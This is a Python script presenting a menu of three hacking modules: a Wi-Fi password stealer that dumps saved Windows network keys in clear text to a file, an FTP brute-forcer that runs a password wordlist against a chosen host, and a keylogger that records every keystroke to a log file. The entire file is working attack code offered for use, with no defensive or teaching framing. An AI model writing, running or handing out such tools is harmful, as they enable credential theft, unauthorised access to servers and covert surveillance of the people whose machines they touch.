import re
import subprocess
from ftplib import FTP  # a class to implement the ftp client side
from colorama import Fore  # for printing fancy colors on terminal
from pynput.keyboard import Listener


def wifi_password_stealer():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
    wifi_data = ""

    for profile in profile_names:
        profile = profile.strip()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"],
                                      capture_output=True).stdout.decode()
        profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)

        if len(profile_password) == 0:
            wifi_data += f"{profile}: Open\n"
        else:
            wifi_data += f"{profile}: {profile_password[0].strip()}\n"

    with open("wifi.txt", "w") as file:
        file.write(wifi_data)


def brute_forcer():
    host = input("Enter the hostname/ip: ")
    username = input("Enter the username: ")
    passwordlist = input("Enter the filename/path of the wordlist: ")

    def check_anon_login(host):
        try:
            with FTP(host) as ftp:
                ftp.login()
                return True
        except Exception as err:
            print(err)
            return False

    def ftp_buster(host, username, passwordlist):
        with open(passwordlist, "r") as passwd_file:
            for password in passwd_file.readlines():
                password = password.strip()
                with FTP(host=host, timeout=0.1) as ftp:
                    try:
                        ftp.login(user=username, passwd=password)
                        print(f"{Fore.GREEN}Password Found: {password}", Fore.RESET)
                        break
                    except Exception as e:
                        print(f"Trying...:{password}", e)
                        continue

    if check_anon_login(host=host):
        print("logged In")
    else:
        print("Anonymous login failed, Trying to brute force the password")
        ftp_buster(host=host, username=username, passwordlist=passwordlist)


def key_logger():
    keys = []

    def on_keypress(key):
        keys.append(key)
        for key in keys:
            log_keys(key)

    def log_keys(key):
        with open("keys.log", 'a') as logfile:
            key = str(key).replace("'", "")
            if key.find("backspace") > 0:
                logfile.write(" backspace ")
            elif key.find("space") > 0:
                logfile.write(" ")
            elif key.find("shift") > 0:
                logfile.write(" shift ")
            elif key.find("enter") > 0:
                logfile.write("\n")
            elif key.find("caps_lock") > 0:
                logfile.write(" capslock ")
            else:
                logfile.write(key)
            keys.clear()

    with Listener(on_press=on_keypress) as listener:
        listener.join()


def run():
    option = int(input("Enter the module to run: "))
    if option == 1:
        wifi_password_stealer()
    elif option == 2:
        brute_forcer()
    elif option == 3:
        key_logger()


run()
